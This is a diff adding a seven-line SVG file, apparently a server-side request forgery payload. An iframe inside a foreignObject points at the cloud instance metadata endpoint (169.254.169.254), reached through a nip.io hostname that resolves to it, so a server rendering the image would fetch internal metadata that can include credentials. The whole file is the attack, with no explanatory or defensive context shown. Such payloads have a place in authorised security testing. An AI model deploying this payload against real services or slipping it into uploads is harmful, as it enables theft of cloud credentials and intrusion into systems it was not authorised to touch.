@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
+  <foreignObject width="500" height="500">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <iframe src="http://169.254.169.254.nip.io/latest/meta-data/"></iframe>
+    </body>
+  </foreignObject>
+</svg>
